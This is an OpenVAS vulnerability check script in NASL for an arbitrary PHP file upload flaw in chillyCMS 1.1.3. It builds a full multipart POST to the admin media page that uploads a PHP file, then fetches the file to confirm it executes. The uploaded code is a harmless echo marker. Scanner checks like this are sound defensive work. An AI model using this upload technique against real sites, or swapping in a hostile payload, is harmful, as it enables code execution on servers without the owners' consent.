###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_chillyCMS_43263.nasl 8438 2018-01-16 17:38:23Z teissa $
#
# chillyCMS Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "chillyCMS is prone to a vulnerability that lets attackers upload
arbitrary files. The issue occurs because the application fails to
adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code
and execute it in the context of the webserver process. This may
facilitate unauthorized access or privilege escalation; other attacks
are also possible.

chillyCMS version 1.1.3 is vulnerable; other versions may also
be affected.";

if(description)
{
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/43263");
 script_xref(name : "URL" , value : "http://www.chillycms.bplaced.net/chillyCMS/");
 script_oid("1.3.6.1.4.1.25623.1.0.100809");
 script_version("$Revision: 8438 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-16 18:38:23 +0100 (Tue, 16 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-09-16 16:08:48 +0200 (Thu, 16 Sep 2010)");
 script_bugtraq_id(43263);
 script_tag(name:"cvss_base", value:"4.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
 script_name("chillyCMS Arbitrary File Upload Vulnerability");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

rand = rand();
file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php");
len  = 713 + strlen(file);
host = http_host_name( port:port );

foreach dir( make_list_unique( "/chillyCMS", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/admin/media.site.php"); 

  req =  string('POST ',url,' HTTP/1.1',"\r\n",
           "Host: ",host,"\r\n",
           "Proxy-Connection: keep-alive\r\n",
           "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
           "Content-Length: ",len,"\r\n",
           "Cache-Control: max-age=0\r\n",
           "Origin: null\r\n",
           "Content-Type: multipart/form-data; boundary=----x\r\n",
           "Accept: text/html\r\n",
           "Accept-Encoding: gzip,deflate,sdch\r\n",
           "Accept-Language: en-US,en;q=0.8\r\n",
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="name"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="pw"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="sentfile"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="destination"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="action"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="file"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'content-Disposition: form-data; name="parent"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="newfolder"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="folder"',"\r\n",
           "\r\n",
           "\r\n",
           "------x\r\n",
           'Content-Disposition: form-data; name="file"; filename="',file,'"',"\r\n",
           "Content-Type: application/octet-stream\r\n",
           "\r\n",
           "<?php echo '<pre>openvas-upload-test</pre>'; ?>\r\n",
           "------x--\r\n",
           "\r\n"); 
  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:FALSE);
  
  if(recv) {

    req2 = http_get(item:string(dir, "/tmp/", file), port:port);
    recv2 = http_keepalive_send_recv(data:req2, port:port, bodyonly:TRUE);

    if (recv2 == NULL) continue;
    if("openvas-upload-test" >< recv2) {
 
      report = string( 
        "Note :\n\n",
        "## It was possible to upload and execute a file on the remote webserver.\n",
        "## The file is placed in directory: ", '"', dir, '/tmp/"', "\n",
        "## and is named: ", '"', file, '"', "\n\n",
        "## You should delete this file as soon as possible!\n");
      security_message(port:port, data:report);
      exit(0);
    }  
  }  
}

exit(0);
